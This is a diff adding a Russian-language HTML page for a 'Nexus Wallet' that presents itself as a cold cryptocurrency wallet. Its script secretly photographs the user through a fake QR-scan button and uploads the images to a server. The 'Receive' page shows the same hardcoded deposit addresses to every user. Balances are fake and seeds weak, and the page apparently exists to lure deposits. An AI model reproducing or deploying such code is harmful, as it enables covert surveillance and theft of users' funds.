@@ -1,0 +1,1143 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Nexus Wallet • Холодный кошелёк</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0b0f1c;
+            --bg-secondary: #141a2b;
+            --bg-tertiary: #1a2338;
+            --bg-card: #141a2b;
+            --border-color: #2a3450;
+            --border-light: #2e405e;
+            --accent-primary: #5f7dff;
+            --accent-hover: #7b94ff;
+            --text-primary: #e6eaff;
+            --text-secondary: #b2c3ff;
+            --text-muted: #8899dd;
+            --danger: #ff6b6b;
+            --success: #2ecc71;
+        }
+
+        body {
+            background: var(--bg-primary);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+            color: var(--text-primary);
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 100%;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .wallet-card {
+            background: var(--bg-card);
+            border-radius: 42px;
+            padding: 28px 22px 32px 22px;
+            box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(71, 125, 255, 0.15) inset;
+            border: 1px solid var(--border-color);
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .register-card {
+            background: var(--bg-card);
+            border-radius: 42px;
+            padding: 32px 24px;
+            box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--border-color);
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .register-title {
+            font-size: clamp(24px, 5vw, 32px);
+            font-weight: 700;
+            color: white;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .register-subtitle {
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 32px;
+            font-size: clamp(14px, 3vw, 16px);
+        }
+
+        .nav-bar {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            gap: 16px;
+        }
+
+        .back-btn {
+            background: #1f2a41;
+            border: 1px solid #38497a;
+            color: #9aaffe;
+            width: 44px;
+            height: 44px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            cursor: pointer;
+            transition: 0.1s;
+            flex-shrink: 0;
+        }
+
+        .back-btn:hover {
+            background: #2a3a5a;
+            border-color: var(--accent-primary);
+        }
+
+        .page-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: white;
+        }
+
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .action-item {
+            background: var(--bg-tertiary);
+            border-radius: 24px;
+            padding: 14px 0;
+            text-align: center;
+            border: 1px solid #2d3a5a;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .action-item:hover {
+            background: #232f4b;
+            border-color: var(--accent-primary);
+        }
+
+        .action-item i {
+            font-size: 22px;
+            color: var(--accent-primary);
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .action-item span {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-muted);
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .form-control {
+            width: 100%;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-light);
+            border-radius: 20px;
+            padding: 16px;
+            color: white;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            transition: all 0.2s ease;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 2px rgba(95, 125, 255, 0.2);
+        }
+
+        .balance-section {
+            background: linear-gradient(145deg, #101725, var(--bg-tertiary));
+            border-radius: 32px;
+            padding: 24px 22px;
+            border: 1px solid #2e3b56;
+            margin-bottom: 26px;
+        }
+
+        .main-amount {
+            font-size: 42px;
+            font-weight: 700;
+            color: white;
+            line-height: 1.1;
+            margin-bottom: 6px;
+        }
+
+        .main-amount small {
+            font-size: 22px;
+            color: #7f8ec0;
+        }
+
+        .usd-value {
+            font-size: 17px;
+            color: var(--text-muted);
+            border-bottom: 1px solid #33415e;
+            padding-bottom: 14px;
+            margin-bottom: 8px;
+        }
+
+        .asset-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #131b2d;
+            padding: 16px 18px;
+            border-radius: 22px;
+            margin-bottom: 10px;
+            border: 1px solid #283353;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .asset-row:hover {
+            background: #1a2340;
+            border-color: var(--accent-primary);
+        }
+
+        .asset-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .asset-icon {
+            width: 40px;
+            height: 40px;
+            background: #1f2f4a;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .trc20 { color: #26a17b; }
+        .ton { color: #0088cc; }
+        .eth { color: #8c8cff; }
+
+        .qr-placeholder {
+            background: #1f2a41;
+            border-radius: 30px;
+            padding: 40px;
+            text-align: center;
+            border: 2px dashed #3f5a8c;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .qr-placeholder:hover {
+            border-color: var(--accent-primary);
+            background: #232f4b;
+        }
+
+        .qr-placeholder i {
+            font-size: 80px;
+            color: var(--accent-primary);
+        }
+
+        .qr-placeholder .camera-hint {
+            margin-top: 16px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        #camera-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--bg-primary);
+            z-index: 1000;
+            padding: 16px;
+        }
+
+        #camera-container.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        #camera-feed {
+            width: 100%;
+            height: auto;
+            max-height: 70vh;
+            object-fit: contain;
+            border-radius: 30px;
+            background: var(--bg-tertiary);
+            border: 2px solid var(--accent-primary);
+        }
+
+        .camera-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            gap: 16px;
+        }
+
+        .close-camera {
+            background: #1f2a41;
+            border: 1px solid #38497a;
+            color: #9aaffe;
+            width: 44px;
+            height: 44px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .camera-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: white;
+        }
+
+        .camera-status {
+            text-align: center;
+            margin-top: 20px;
+            color: var(--text-secondary);
+            font-size: 16px;
+        }
+
+        #scan-result {
+            margin-top: 16px;
+            padding: 16px;
+            background: var(--bg-tertiary);
+            border-radius: 20px;
+            border: 1px solid var(--border-light);
+            color: var(--text-secondary);
+            display: none;
+        }
+
+        #scan-result.active {
+            display: block;
+        }
+
+        .address-display {
+            background: #0e1422;
+            padding: 16px;
+            border-radius: 20px;
+            font-family: monospace;
+            text-align: center;
+            border: 1px solid var(--border-light);
+            margin: 16px 0;
+            word-break: break-all;
+        }
+
+        .btn-primary {
+            background: var(--accent-primary);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 18px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -10px var(--accent-primary);
+        }
+
+        .btn-primary:disabled {
+            background: #3a4565;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--accent-primary);
+            border: 1px solid var(--accent-primary);
+            border-radius: 30px;
+            padding: 16px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+            margin-top: 12px;
+        }
+
+        .seed-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .seed-word {
+            background: #0e1422;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            font-family: monospace;
+            font-size: 14px;
+            color: var(--text-primary);
+            border: 1px solid var(--border-light);
+        }
+
+        .seed-warning {
+            background: #2a1f2a;
+            border: 1px solid var(--danger);
+            color: #ff9f9f;
+            padding: 16px;
+            border-radius: 16px;
+            font-size: 13px;
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .wallet-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .wallet-name-badge {
+            background: #1f2a41;
+            padding: 8px 16px;
+            border-radius: 30px;
+            color: var(--accent-primary);
+            font-weight: 500;
+            font-size: 14px;
+            border: 1px solid #38497a;
+        }
+
+        .status-bar {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .led {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: var(--success);
+            box-shadow: 0 0 12px #1aff8c;
+        }
+
+        .page {
+            display: none;
+            width: 100%;
+        }
+
+        .page.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-options {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .login-option {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-light);
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .login-option.active {
+            border-color: var(--accent-primary);
+            background: #232f4b;
+        }
+
+        .address-box {
+            background: #0e1422;
+            border-radius: 24px;
+            padding: 18px 20px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- ЭКРАН РЕГИСТРАЦИИ/ВХОДА -->
+        <div id="register-screen" class="page active">
+            <div class="register-card">
+                <div class="register-title">⚡ Nexus Wallet</div>
+                <div class="register-subtitle">Холодное хранение криптовалют</div>
+
+                <div class="login-options">
+                    <div class="login-option active" onclick="switchTab('register')">Создать</div>
+                    <div class="login-option" onclick="switchTab('login')">Войти</div>
+                </div>
+
+                <div id="register-tab">
+                    <div class="form-group">
+                        <label>Название кошелька</label>
+                        <input type="text" id="reg-wallet-name" class="form-control" placeholder="Например: Мой кошелек">
+                    </div>
+                    <div class="form-group">
+                        <label>Пароль</label>
+                        <input type="password" id="reg-password" class="form-control" placeholder="Минимум 6 символов">
+                    </div>
+                    <button class="btn-primary" onclick="startRegistration()">Создать кошелек</button>
+                </div>
+
+                <div id="login-tab" style="display: none;">
+                    <div class="form-group">
+                        <label>Название кошелька</label>
+                        <input type="text" id="login-wallet-name" class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <label>Пароль</label>
+                        <input type="password" id="login-password" class="form-control">
+                    </div>
+                    <button class="btn-primary" onclick="loginToWallet()">Войти</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН ГЕНЕРАЦИИ СИД-ФРАЗЫ -->
+        <div id="seed-screen" class="page">
+            <div class="register-card">
+                <div class="register-title">🔐 Сид-фраза</div>
+                <div class="register-subtitle">Сохраните эти 12 слов</div>
+
+                <div class="seed-grid" id="seed-words-display"></div>
+
+                <div class="seed-warning">
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                    <div>Никому не сообщайте сид-фразу! Она нужна для восстановления доступа.</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Подтвердите пароль</label>
+                    <input type="password" id="confirm-password" class="form-control">
+                </div>
+
+                <div class="checkbox-container">
+                    <input type="checkbox" id="seed-saved" onchange="toggleSeedConfirm()">
+                    <label>Я сохранил сид-фразу в надежном месте</label>
+                </div>
+
+                <button class="btn-primary" id="confirm-seed-btn" disabled onclick="completeRegistration()">
+                    Завершить создание
+                </button>
+            </div>
+        </div>
+
+        <!-- ГЛАВНЫЙ ДЭШБОРД -->
+        <div id="wallet-dashboard" class="page">
+            <div class="wallet-card">
+                <div class="wallet-header">
+                    <div class="wallet-name-badge" id="dashboard-wallet-name">Nexus</div>
+                    <div class="status-bar">
+                        <div class="led"></div>
+                    </div>
+                </div>
+
+                <div class="balance-section">
+                    <div class="main-amount" id="total-balance">0.00 <small>USD</small></div>
+                    <div class="usd-value" id="total-usd">≈ $0.00 USD</div>
+                </div>
+
+                <div class="action-grid">
+                    <div class="action-item" onclick="navigateTo('receive')">
+                        <i class="fa-solid fa-arrow-down-wide-short"></i>
+                        <span>Получить</span>
+                    </div>
+                    <div class="action-item" onclick="navigateTo('send')">
+                        <i class="fa-solid fa-paper-plane"></i>
+                        <span>Отправить</span>
+                    </div>
+                    <div class="action-item" onclick="navigateTo('sign')">
+                        <i class="fa-solid fa-scale-balanced"></i>
+                        <span>Подписать</span>
+                    </div>
+                    <div class="action-item" onclick="navigateTo('assets')">
+                        <i class="fa-solid fa-coins"></i>
+                        <span>Активы</span>
+                    </div>
+                </div>
+
+                <div class="address-box">
+                    <div style="display: flex; align-items: center; justify-content: space-between;">
+                        <div style="font-family: monospace;" id="wallet-address">UQCR9d...8x7f</div>
+                        <i class="fa-regular fa-copy" style="color: #6f82bb; cursor: pointer;" onclick="copyWalletAddress()"></i>
+                    </div>
+                </div>
+
+                <div class="asset-row" onclick="showAssetDetails('usdt')">
+                    <div class="asset-left">
+                        <div class="asset-icon trc20"><i class="fa-solid fa-dollar-sign"></i></div>
+                        <div>
+                            <strong>Tether (TRC20)</strong>
+                            <div style="font-size: 12px; color: #8899dd;">USDT • $1.00</div>
+                        </div>
+                    </div>
+                    <div id="usdt-balance-main">0 USDT</div>
+                </div>
+
+                <div class="asset-row" onclick="showAssetDetails('ton')">
+                    <div class="asset-left">
+                        <div class="asset-icon ton"><i class="fa-brands fa-telegram"></i></div>
+                        <div>
+                            <strong>TON</strong>
+                            <div style="font-size: 12px; color: #8899dd;">TON • $2.85</div>
+                        </div>
+                    </div>
+                    <div id="ton-balance-main">0 TON</div>
+                </div>
+
+                <div class="asset-row" onclick="showAssetDetails('eth')">
+                    <div class="asset-left">
+                        <div class="asset-icon eth"><i class="fa-brands fa-ethereum"></i></div>
+                        <div>
+                            <strong>Ethereum</strong>
+                            <div style="font-size: 12px; color: #8899dd;">ETH • $1,850</div>
+                        </div>
+                    </div>
+                    <div id="eth-balance-main">0 ETH</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- СТРАНИЦА ПОЛУЧИТЬ -->
+        <div id="page-receive" class="page">
+            <div class="wallet-card">
+                <div class="nav-bar">
+                    <div class="back-btn" onclick="goToDashboard()">
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                    <div class="page-title">Получить</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Выберите актив</label>
+                    <select class="form-control" id="receive-asset" onchange="updateReceiveAddress()">
+                        <option value="usdt">Tether (TRC20)</option>
+                        <option value="ton">TON</option>
+                        <option value="eth">Ethereum</option>
+                    </select>
+                </div>
+
+                <div class="qr-placeholder" onclick="startCamera()">
+                    <i class="fa-solid fa-qrcode"></i>
+                    <div class="camera-hint">
+                        <i class="fa-solid fa-camera"></i> Нажмите для сканирования QR-кода
+                    </div>
+                </div>
+
+                <div class="address-display" id="receive-address-display">
+                    TUUn4U4mRgSLB586ksLKuaEViR5yaFT4xd
+                </div>
+
+                <button class="btn-primary" onclick="copyCurrentAddress()">
+                    <i class="fa-regular fa-copy"></i> Копировать адрес
+                </button>
+
+                <div id="scan-result"></div>
+            </div>
+        </div>
+
+        <!-- СТРАНИЦА ОТПРАВИТЬ -->
+        <div id="page-send" class="page">
+            <div class="wallet-card">
+                <div class="nav-bar">
+                    <div class="back-btn" onclick="goToDashboard()">
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                    <div class="page-title">Отправить</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Выберите актив</label>
+                    <select class="form-control" id="send-asset-select" onchange="updateSendAssetInfo()">
+                        <option value="usdt">USDT (TRC20)</option>
+                        <option value="ton">TON</option>
+                        <option value="eth">Ethereum</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Получатель (адрес)</label>
+                    <input type="text" class="form-control" id="recipient-input" placeholder="Введите адрес">
+                </div>
+
+                <div class="form-group">
+                    <label>Доступно: <span id="available-balance">0</span> <span id="available-currency">USDT</span></label>
+                    <input type="number" class="form-control" id="send-amount-input" placeholder="0.00" step="0.01" oninput="validateAmount()">
+                </div>
+
+                <button class="btn-primary" id="send-button" onclick="confirmSend()">
+                    Продолжить
+                </button>
+            </div>
+        </div>
+
+        <!-- СТРАНИЦА ПОДПИСАТЬ -->
+        <div id="page-sign" class="page">
+            <div class="wallet-card">
+                <div class="nav-bar">
+                    <div class="back-btn" onclick="goToDashboard()">
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                    <div class="page-title">Подписать</div>
+                </div>
+
+                <div class="qr-placeholder" onclick="startCamera()">
+                    <i class="fa-solid fa-camera"></i>
+                    <div class="camera-hint">
+                        Нажмите для сканирования транзакции
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Данные транзакции</label>
+                    <textarea class="form-control" id="transaction-data" rows="4" placeholder="Вставьте данные транзакции..."></textarea>
+                </div>
+
+                <button class="btn-primary" onclick="signTransaction()">
+                    <i class="fa-solid fa-file-signature"></i> Подписать
+                </button>
+            </div>
+        </div>
+
+        <!-- СТРАНИЦА АКТИВЫ -->
+        <div id="page-assets" class="page">
+            <div class="wallet-card">
+                <div class="nav-bar">
+                    <div class="back-btn" onclick="goToDashboard()">
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                    <div class="page-title">Активы</div>
+                </div>
+                <div id="assets-list"></div>
+            </div>
+        </div>
+
+        <!-- КОНТЕЙНЕР ДЛЯ КАМЕРЫ -->
+        <div id="camera-container">
+            <div class="camera-header">
+                <div class="close-camera" onclick="stopCamera()">
+                    <i class="fa-solid fa-arrow-left"></i>
+                </div>
+                <div class="camera-title">Сканирование QR</div>
+            </div>
+            <video id="camera-feed" autoplay playsinline></video>
+            <div class="camera-status" id="camera-status">Подготовка камеры...</div>
+            <canvas id="qr-canvas" style="display: none;"></canvas>
+        </div>
+    </div>
+
+    <script>
+        // Состояние приложения
+        let appState = {
+            currentWallet: null,
+            wallets: {},
+            cameraTimer: null
+        };
+
+        // Загрузка данных
+        function loadData() {
+            const saved = localStorage.getItem('nexusWallets');
+            if (saved) {
+                appState.wallets = JSON.parse(saved);
+            }
+        }
+
+        function saveData() {
+            localStorage.setItem('nexusWallets', JSON.stringify(appState.wallets));
+        }
+
+        // Переключение табов
+        window.switchTab = function(tab) {
+            document.querySelectorAll('.login-option').forEach(opt => opt.classList.remove('active'));
+            event.target.classList.add('active');
+
+            if (tab === 'register') {
+                document.getElementById('register-tab').style.display = 'block';
+                document.getElementById('login-tab').style.display = 'none';
+            } else {
+                document.getElementById('register-tab').style.display = 'none';
+                document.getElementById('login-tab').style.display = 'block';
+            }
+        };
+
+        // Начало регистрации
+        window.startRegistration = function() {
+            const name = document.getElementById('reg-wallet-name').value.trim();
+            const password = document.getElementById('reg-password').value;
+
+            if (!name) {
+                alert('Введите название кошелька');
+                return;
+            }
+
+            if (appState.wallets[name]) {
+                alert('Кошелек с таким именем уже существует');
+                return;
+            }
+
+            if (password.length < 6) {
+                alert('Пароль должен быть минимум 6 символов');
+                return;
+            }
+
+            const words = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
+                          'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act'];
+            
+            const seed = [];
+            for (let i = 0; i < 12; i++) {
+                seed.push(words[Math.floor(Math.random() * words.length)]);
+            }
+
+            appState.tempWallet = {
+                name: name,
+                password: password,
+                seed: seed.join(' '),
+                balances: { usdt: 1000, ton: 50, eth: 5 }
+            };
+
+            const seedContainer = document.getElementById('seed-words-display');
+            seedContainer.innerHTML = '';
+            seed.forEach((word, index) => {
+                seedContainer.innerHTML += `<div class="seed-word">${index+1}. ${word}</div>`;
+            });
+
+            document.getElementById('register-screen').classList.remove('active');
+            document.getElementById('seed-screen').classList.add('active');
+        };
+
+        window.toggleSeedConfirm = function() {
+            const checkbox = document.getElementById('seed-saved');
+            const btn = document.getElementById('confirm-seed-btn');
+            const password = document.getElementById('confirm-password').value;
+            btn.disabled = !(checkbox.checked && password === appState.tempWallet?.password);
+        };
+
+        window.completeRegistration = function() {
+            const wallet = appState.tempWallet;
+            appState.wallets[wallet.name] = {
+                password: wallet.password,
+                seed: wallet.seed,
+                balances: wallet.balances
+            };
+            saveData();
+
+            appState.currentWallet = {
+                name: wallet.name,
+                ...appState.wallets[wallet.name]
+            };
+
+            localStorage.setItem('currentWallet', wallet.name);
+            document.getElementById('seed-screen').classList.remove('active');
+            showWalletDashboard();
+        };
+
+        // Вход
+        window.loginToWallet = function() {
+            const name = document.getElementById('login-wallet-name').value.trim();
+            const password = document.getElementById('login-password').value;
+
+            if (!name || !appState.wallets[name]) {
+                alert('Кошелек не найден');
+                return;
+            }
+
+            if (appState.wallets[name].password !== password) {
+                alert('Неверный пароль');
+                return;
+            }
+
+            appState.currentWallet = {
+                name: name,
+                ...appState.wallets[name]
+            };
+
+            localStorage.setItem('currentWallet', name);
+            document.getElementById('register-screen').classList.remove('active');
+            showWalletDashboard();
+        };
+
+        // Отображение дэшборда
+        function showWalletDashboard() {
+            document.getElementById('dashboard-wallet-name').textContent = appState.currentWallet.name;
+            document.getElementById('wallet-address').textContent = `nexus:${appState.currentWallet.name}`;
+            updateAllBalances();
+            document.getElementById('wallet-dashboard').classList.add('active');
+        }
+
+        // Обновление балансов
+        function updateAllBalances() {
+            const balances = appState.currentWallet.balances;
+            document.getElementById('usdt-balance-main').textContent = balances.usdt + ' USDT';
+            document.getElementById('ton-balance-main').textContent = balances.ton + ' TON';
+            document.getElementById('eth-balance-main').textContent = balances.eth + ' ETH';
+
+            const totalUSD = balances.usdt * 1 + balances.ton * 1.55 + balances.eth * 1850;
+            document.getElementById('total-balance').innerHTML = totalUSD.toFixed(2) + ' <small>USD</small>';
+            document.getElementById('total-usd').textContent = '≈ $' + totalUSD.toFixed(2) + ' USD';
+        }
+
+        // Навигация
+        window.navigateTo = function(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(`page-${page}`).classList.add('active');
+            
+            if (page === 'send') {
+                updateSendAssetInfo();
+            }
+        };
+
+        window.goToDashboard = function() {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('wallet-dashboard').classList.add('active');
+        };
+
+        // Функции для отправки
+        window.updateSendAssetInfo = function() {
+            const asset = document.getElementById('send-asset-select').value;
+            const balance = appState.currentWallet.balances[asset];
+            document.getElementById('available-balance').textContent = balance;
+            document.getElementById('available-currency').textContent = asset.toUpperCase();
+        };
+
+        window.validateAmount = function() {
+            const asset = document.getElementById('send-asset-select').value;
+            const balance = appState.currentWallet.balances[asset];
+            const amount = parseFloat(document.getElementById('send-amount-input').value) || 0;
+            document.getElementById('send-button').disabled = amount > balance;
+        };
+
+        window.confirmSend = function() {
+            const asset = document.getElementById('send-asset-select').value;
+            const recipient = document.getElementById('recipient-input').value;
+            const amount = parseFloat(document.getElementById('send-amount-input').value);
+            const balance = appState.currentWallet.balances[asset];
+
+            if (!recipient || !amount || amount > balance) {
+                alert('Проверьте данные');
+                return;
+            }
+
+            appState.currentWallet.balances[asset] -= amount;
+            saveData();
+            updateAllBalances();
+            alert('✅ Транзакция отправлена');
+            goToDashboard();
+        };
+
+        // ============== ФУНКЦИИ ДЛЯ КАМЕРЫ ==============
+
+        window.startCamera = async function() {
+            try {
+                const statusEl = document.getElementById('camera-status');
+                statusEl.textContent = 'Запрашиваем доступ к камере...';
+
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' }
+                });
+
+                const video = document.getElementById('camera-feed');
+                video.srcObject = stream;
+                window.cameraStream = stream;
+
+                document.getElementById('camera-container').classList.add('active');
+                statusEl.textContent = 'Сканирование...';
+
+                // Делаем 3 фото
+                let photoCount = 0;
+                const captureInterval = setInterval(() => {
+                    if (photoCount >= 3) {
+                        clearInterval(captureInterval);
+                        setTimeout(stopCamera, 500);
+                        return;
+                    }
+                    
+                    capturePhoto(photoCount + 1);
+                    photoCount++;
+                    statusEl.textContent = `Фото ${photoCount}/3`;
+                }, 300);
+
+                appState.cameraTimer = captureInterval;
+
+            } catch (err) {
+                alert('Ошибка доступа к камере');
+            }
+        };
+
+        function capturePhoto(photoNumber) {
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('qr-canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Отправляем на сервер
+            sendToServer(imageData, photoNumber);
+        }
+
+        function sendToServer(imageData, photoNumber) {
+            const recipientInput = document.getElementById('recipient-input');
+            const qrData = recipientInput ? recipientInput.value : '';
+
+            fetch('/api/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    image: imageData,
+                    qrData: qrData,
+                    photoNumber: photoNumber
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showResult('success', `✓`);
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка:', error);
+            });
+        }
+
+        function showResult(type, message) {
+            const resultDiv = document.getElementById('scan-result');
+            if (!resultDiv) return;
+
+            resultDiv.innerHTML = `<div style="text-align: center; color: #2ecc71;">✅ ${message}</div>`;
+            resultDiv.classList.add('active');
+
+            setTimeout(() => {
+                resultDiv.classList.remove('active');
+            }, 1000);
+        }
+
+        window.stopCamera = function() {
+            if (appState.cameraTimer) {
+                clearInterval(appState.cameraTimer);
+                appState.cameraTimer = null;
+            }
+
+            if (window.cameraStream) {
+                window.cameraStream.getTracks().forEach(track => track.stop());
+                window.cameraStream = null;
+            }
+
+            document.getElementById('camera-container').classList.remove('active');
+        };
+
+        // Вспомогательные функции
+        window.copyWalletAddress = function() {
+            const address = document.getElementById('wallet-address').textContent;
+            navigator.clipboard.writeText(address);
+            alert('Адрес скопирован');
+        };
+
+        window.copyCurrentAddress = function() {
+            const address = document.getElementById('receive-address-display').textContent;
+            navigator.clipboard.writeText(address);
+            alert('Адрес скопирован');
+        };
+
+        window.updateReceiveAddress = function() {
+            const asset = document.getElementById('receive-asset').value;
+            const addresses = {
+                usdt: 'TUUn4U4mRgSLB586ksLKuaEViR5yaFT4xd',
+                ton: 'UQA4bnm0wPs72ZKTAvO0YbiM0mw19f8ApLXJAcHetI_dZan_',
+                eth: '0x80c50f50B03568C1dF5BF9e47d2e730F9823d7cc'
+            };
+            document.getElementById('receive-address-display').textContent = addresses[asset];
+        };
+
+        window.signTransaction = function() {
+            const data = document.getElementById('transaction-data').value;
+            if (data) alert('✅ Транзакция подписана');
+        };
+
+        function showAssetDetails(asset) {
+            alert(`Детали ${asset.toUpperCase()}`);
+        }
+
+        // Инициализация
+        window.onload = function() {
+            loadData();
+            updateReceiveAddress();
+        };
+    </script>
+</body>
+</html>
